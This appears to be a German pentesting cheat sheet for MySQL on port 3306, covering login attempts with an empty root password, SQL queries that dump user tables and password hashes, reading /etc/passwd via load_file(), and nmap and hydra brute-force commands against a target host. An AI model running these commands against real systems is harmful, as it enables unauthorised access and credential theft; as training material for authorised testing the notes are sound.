# 🐬 MySQL — 3306

> MySQL ist nicht Microsoft SQL Server. Für Port `1433`, `impacket-mssqlclient` und T-SQL siehe [MSSQL / T-SQL](./mssql.md).

## 1. Verbinden

```bash
# Leeres Passwort testen
mysql -h $RHOST -u root

# Passwort interaktiv eingeben
mysql -h $RHOST -u <USER> -p

# Einzelnen Befehl direkt ausführen
mysql -h $RHOST -u <USER> -p'<PASS>' -e 'SHOW DATABASES;'
```

**Was anpassen?** `<USER>` und `<PASS>` durch gefundene Credentials ersetzen. Bei Sonderzeichen Passwort immer in einfache Anführungszeichen setzen.

---

## 2. Orientierung in MySQL

```sql
SELECT VERSION(), USER(), CURRENT_USER(), DATABASE();
SHOW DATABASES;
USE <DATENBANK>;
SHOW TABLES;
DESCRIBE <TABELLE>;
SELECT * FROM <TABELLE> LIMIT 20;
```

Gezielt nach Credentials suchen:

```sql
SELECT user, host, authentication_string FROM mysql.user;
SELECT * FROM users;
SELECT username, password FROM users;
```

**Was macht was?**

- `SHOW DATABASES;` listet Datenbanken.
- `USE <DATENBANK>;` wechselt den Kontext.
- `SHOW TABLES;` listet Tabellen der aktuellen Datenbank.
- `DESCRIBE <TABELLE>;` zeigt Spaltennamen, damit du nicht blind `SELECT *` raten musst.

---

## 3. Datei-Leserechte prüfen

```sql
SELECT @@version, @@hostname, @@datadir, @@secure_file_priv;
SELECT load_file('/etc/passwd');
```

`load_file()` funktioniert nur, wenn der DB-Account das `FILE`-Privileg hat und MySQL den Pfad lesen darf.

---

## 4. Schnelle Enumeration von außen

```bash
nmap -sCV -p3306 $RHOST
nmap -p3306 --script mysql-empty-password,mysql-info $RHOST
hydra -L users.txt -P passwords.txt mysql://$RHOST -t 4 -f
```

> **Hinweis:** Nicht unnötig brute-forcen. Erst Config-Dateien, Backups, Webseiten und Standard-Credentials prüfen.
